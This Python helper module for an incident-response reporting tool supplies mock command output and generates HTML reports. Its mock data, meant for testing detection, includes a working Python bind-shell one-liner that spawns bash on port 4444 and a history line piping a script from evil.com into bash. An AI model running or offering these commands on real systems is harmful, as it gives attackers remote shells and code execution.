import os
import plistlib
import re
from dataclasses import dataclass
from typing import List, Optional, Dict, Any, Union
import subprocess
import datetime
import webbrowser

# --- Data classes ---
@dataclass
class USBDevice:
    name: str
    manufacturer: Optional[str] = None
    product_id: Optional[str] = None
    vendor_id: Optional[str] = None
    serial: Optional[str] = None
    location_id: Optional[str] = None

@dataclass
class DiskInfo:
    name: str
    type: str
    size_gb: float
    used: Optional[str] = None
    available: Optional[str] = None
    filesystem: Optional[str] = None
    mount_point: Optional[str] = None
    serial: Optional[str] = None
    volume_name: Optional[str] = None
    device_identifier: Optional[str] = None

# --- Mock Application Instance ---
class MockAppInstance:
    def __init__(self):
        self.suspect_computer_name = "Test_Computer"
        self.report_output_directory = "reports"
        os.makedirs(self.report_output_directory, exist_ok=True)
    def log_output(self, *args):
        print(*args)
    def set_hostname(self, new_hostname):
        self.suspect_computer_name = new_hostname

# --- Helpers class with mock/live switch ---
class Helpers:
    def __init__(self, use_mock: bool = True):
        self.use_mock = use_mock

    def log_output(self, app_instance: Any, *args):
        if app_instance:
            app_instance.log_output(*args)
        else:
            print("[Helpers Log]", *args)

    def run_command(self, command: str, check_shell: bool = False, app_instance: Optional[MockAppInstance] = None) -> str:
        if self.use_mock:
            cmd_display = " ".join(command) if isinstance(command, list) else command
            self.log_output(app_instance, f"[MOCK] Running command: {cmd_display}")
            return self.mock_run_command(command)
        else:
            self.log_output(app_instance, f"[LIVE] Running command: {command}")
            try:
                result = subprocess.run(
                    command, shell=check_shell, capture_output=True, text=True,
                    check=False, encoding='utf-8', errors='ignore'
                )
                if result.returncode != 0:
                    self.log_output(app_instance, f"Command '{command}' failed with exit code {result.returncode}")
                    if result.stdout: self.log_output(app_instance, f"STDOUT: {result.stdout.strip()}")
                    if result.stderr: self.log_output(app_instance, f"STDERR: {result.stderr.strip()}")
                    return ""
                if result.stderr:
                    self.log_output(app_instance, f"Command '{command}' produced stderr output: {result.stderr.strip()}")
                return result.stdout
            except FileNotFoundError:
                self.log_output(app_instance, f"Command not found: '{command.split()[0]}'")
                return ""
            except Exception as e:
                self.log_output(app_instance, f"An unexpected error occurred while running command '{command}': {e}")
                return ""

    # --- NEW: Alias for backwards compatibility ---
    def run_cmd(self, command: str, check_shell: bool = False, app_instance: Optional[MockAppInstance] = None) -> str:
        return self.run_command(command, check_shell, app_instance)

    # ... rest of your code unchanged ...

    # (mock_run_command, read_plist_file, generate_report_html, etc.)


    def mock_run_command(self, command: str) -> str:
        # --- MOCK DATA FOR USER & SECURITY REPORTS ---
        if isinstance(command, list):
            command = " ".join(command)
            
        if "wmic useraccount get" in command:
            return """
Disabled=FALSE
Name=Administrator
SID=S-1-5-21-000000000-000000000-000000000-500
Status=OK

Disabled=TRUE
Name=Guest
SID=S-1-5-21-000000000-000000000-000000000-501
Status=OK

Disabled=FALSE
Name=spencer
SID=S-1-5-21-000000000-000000000-000000000-1001
Status=OK

Disabled=FALSE
Name=hax0r
SID=S-1-5-21-000000000-000000000-000000000-1002
Status=Degraded
"""
        elif "net localgroup Administrators" in command:
            return "Members\n-------------------------------------------------------------------------------\nAdministrator\nspencer\nhax0r\n"
        elif "awk -F: " in command and "/etc/passwd" in command:
            return """root 0 /root /bin/bash
daemon 1 /usr/sbin /usr/sbin/nologin
spencer 1000 /home/spencer /bin/bash
hax0r 1001 /home/hax0r /bin/bash
"""
        elif command.startswith("dscl . -read /Users/"):
            user = command.split('/')[-1].split(' ')[0]
            if user == "root": return "UniqueID: 0\nNFSHomeDirectory: /var/root\nUserShell: /bin/sh\nRealName: System Administrator"
            if user == "spencer": return "UniqueID: 501\nNFSHomeDirectory: /Users/spencer\nUserShell: /bin/zsh\nRealName: Spencer"
            if user.startswith('_'): return f"UniqueID: 123\nNFSHomeDirectory: /var/empty\nUserShell: /usr/bin/false\nRealName: {user} Service"
            return ""
        elif "dscl . -list /Users" in command:
            return "root\nspencer\n_spotlight\n_sshd\n"
        elif "dscl . -read /Groups/admin GroupMembership" in command:
            return "GroupMembership: root spencer"
        elif "grep -E 'useradd|sshd.*(Accepted|Failed)'" in command:
            return """
Jul 25 10:00:01 my-linux-box sshd[1234]: Accepted password for spencer from 192.168.1.100 port 12345 ssh2
Jul 25 10:05:00 my-linux-box useradd[2345]: new user: name=hax0r, UID=1001, GID=1001, home=/home/hax0r, shell=/bin/bash
Jul 25 11:00:00 my-linux-box sshd[3456]: Failed password for root from 10.0.0.1 port 54321 ssh2
"""
        # --- MOCK DATA FOR NETWORK REPORTS ---
        elif "ss -tulpn" in command:
            return """
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN   0        128            0.0.0.0:22             0.0.0.0:* users:(("sshd",pid=123,fd=3))
ESTAB    0        0          192.168.1.50:22        192.168.1.100:12345  users:(("sshd",pid=456,fd=4))
LISTEN   0        4096           0.0.0.0:4444           0.0.0.0:* users:(("python3",pid=666,fd=3))
"""
        elif "lsof -i -P -n" in command:
            return """
COMMAND   PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
sshd      123    root    3u  IPv4 0xdeadbeef00000000      0t0  TCP *:22 (LISTEN)
python3   666  spencer   3u  IPv4 0xdeadbeef11111111      0t0  TCP *:4444 (LISTEN)
"""
        elif "netstat -ano" in command:
            return """
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1234
  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       666
  TCP    192.168.1.50:49700     10.1.1.1:443           ESTABLISHED     5678
"""
        elif "sudo nethogs" in command or "sudo tcpdump" in command:
            return "Refreshing:\n\nsshd[123]       192.168.1.50:22-192.168.1.100:12345    0.123\t0.456 KB/sec\npython3[666]      0.0.0.0:4444-10.0.0.5:54321                 1.234\t5.678 KB/sec\n"
        
        # --- MOCK DATA FOR PROCESS & MALWARE REPORTS ---
        elif "ps aux | grep '[p]ython'" in command:
            return "spencer   666  0.5  0.1 123456  7890 ?        S    Jul24   0:05 /usr/bin/python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        elif "ps aux" in command:
            return """
USER       PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
root         1   0.0  0.0   167404   1156   ??  Ss   Jul24     0:00.01 /sbin/launchd
spencer    666   0.5  0.1   123456   7890   ??  S    Jul24     0:05.00 /usr/bin/python3 -c '...'
root      1234   0.1  0.5   456789   8765   ??  S    Jul24     1:01.23 /usr/sbin/sshd
"""
        elif "grep -E" in command and "~/.bash_history" in command:
            return """
curl http://evil.com/payload.sh | bash
python3 -c 'import socket,os; ...'
"""
        elif "ls -la /tmp" in command:
            return """
total 8
drwxrwxrwt  1 root    root    4096 Jul 25 19:50 .
drwxr-xr-x  1 root    root    4096 Jul 25 10:00 ..
-rwxr-xr-x  1 hax0r   hax0r     88 Jul 25 10:05 payload.sh
"""
        # Fallback for other commands if needed
        return ""


    def read_plist_file(self, file_path, app_instance=None):
        """Mock function for reading plist files. Replace with your actual implementation."""
        if "com.example.daemon.plist" in file_path:
            return {"Label": "com.example.daemon", "ProgramArguments": ["/usr/local/bin/mydaemon"], "RunAtLoad": True}
        return None

    def generate_report_html(self, app_instance: Any, suspect_computer_name: str, file_name: str, report_title: str, html_body: str, browser_preference: str = "System Default"):
        """
        Generates an HTML report file, now with built-in filtering and sorting JS.
        """
        output_dir = app_instance.report_output_directory
        os.makedirs(output_dir, exist_ok=True)
        file_path = os.path.join(output_dir, file_name)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        filter_html = ""
        if "<table>" in html_body:
            filter_html = """
            <div class="filter-container">
                <label for="tableFilter">Filter results:</label>
                <input type="text" id="tableFilter" onkeyup="filterTable()" placeholder="Type to search...">
            </div>
            """

        html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{report_title}</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; color: #333; background-color: #f4f4f4; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }}
        h1, h2, h3 {{ color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 5px; }}
        h1 {{ font-size: 2em; }} h2 {{ font-size: 1.5em; margin-top: 30px; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; font-weight: bold; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        pre {{ background-color: #eee; padding: 15px; border: 1px solid #ccc; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; font-family: "Courier New", Courier, monospace; }}
        .footer {{ text-align: center; margin-top: 30px; font-size: 0.9em; color: #777; }}
        .filter-container {{ margin-bottom: 15px; }}
        #tableFilter {{ padding: 8px; width: 300px; border: 1px solid #ddd; border-radius: 4px; }}
        th.sortable {{ cursor: pointer; position: relative; }}
        th.sortable:hover {{ background-color: #e8e8e8; }}
        th.sortable::after {{ content: ''; position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 0.8em; opacity: 0.5; }}
        th.sort-asc::after {{ content: ' ▲'; opacity: 1; }}
        th.sort-desc::after {{ content: ' ▼'; opacity: 1; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{report_title}</h1>
        <p><strong>Suspect Computer:</strong> {suspect_computer_name}</p>
        <p><strong>Report Generated:</strong> {timestamp}</p>
        {filter_html}
        {html_body}
        <div class="footer"><p>IRIS Incident Response Report</p></div>
    </div>
    <script>
    function filterTable() {{
        const filter = document.getElementById("tableFilter").value.toUpperCase();
        const tables = document.querySelectorAll("table");
        tables.forEach(table => {{
            const rows = table.getElementsByTagName("tr");
            for (let i = 1; i < rows.length; i++) {{ // Start at 1 to skip header row
                const cells = rows[i].getElementsByTagName("td");
                let found = false;
                for (let j = 0; j < cells.length; j++) {{
                    if (cells[j] && cells[j].textContent.toUpperCase().indexOf(filter) > -1) {{
                        found = true;
                        break;
                    }}
                }}
                rows[i].style.display = found ? "" : "none";
            }}
        }});
    }}

    function sortTable(table, column, asc = true) {{
        const dirModifier = asc ? 1 : -1;
        const tBody = table.tBodies[0];
        const rows = Array.from(tBody.querySelectorAll("tr"));

        const sortedRows = rows.sort((a, b) => {{
            const aColText = a.querySelector(`td:nth-child(${{column + 1}})`).textContent.trim();
            const bColText = b.querySelector(`td:nth-child(${{column + 1}})`).textContent.trim();
            // Basic numeric comparison
            const aNum = parseFloat(aColText);
            const bNum = parseFloat(bColText);
            if (!isNaN(aNum) && !isNaN(bNum)) {{
                return (aNum - bNum) * dirModifier;
            }}
            return aColText.localeCompare(bColText) * dirModifier;
        }});

        while (tBody.firstChild) {{
            tBody.removeChild(tBody.firstChild);
        }}
        tBody.append(...sortedRows);

        table.querySelectorAll("th").forEach(th => th.classList.remove("sort-asc", "sort-desc"));
        table.querySelector(`th:nth-child(${{column + 1}})`).classList.toggle("sort-asc", asc);
        table.querySelector(`th:nth-child(${{column + 1}})`).classList.toggle("sort-desc", !asc);
    }}

    document.querySelectorAll("th").forEach(headerCell => {{
        // Only make headers of tables with a tbody sortable
        const table = headerCell.closest("table");
        if (table && table.tBodies[0] && table.tBodies[0].rows.length > 0) {{
            headerCell.classList.add("sortable");
            headerCell.addEventListener("click", () => {{
                const headerIndex = Array.prototype.indexOf.call(headerCell.parentElement.children, headerCell);
                const currentIsAsc = headerCell.classList.contains("sort-asc");
                sortTable(table, headerIndex, !currentIsAsc);
            }});
        }}
    }});
    </script>
</body>
</html>
"""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(html_template)
            self.log_output(app_instance, f"Successfully generated report: {file_path}")
        except IOError as e:
            self.log_output(app_instance, f"Error writing report file {file_path}: {e}")
            return

        if browser_preference != "None":
            try:
                webbrowser.open('file://' + os.path.realpath(file_path))
            except Exception as e:
                self.log_output(app_instance, f"Could not open report in browser: {e}")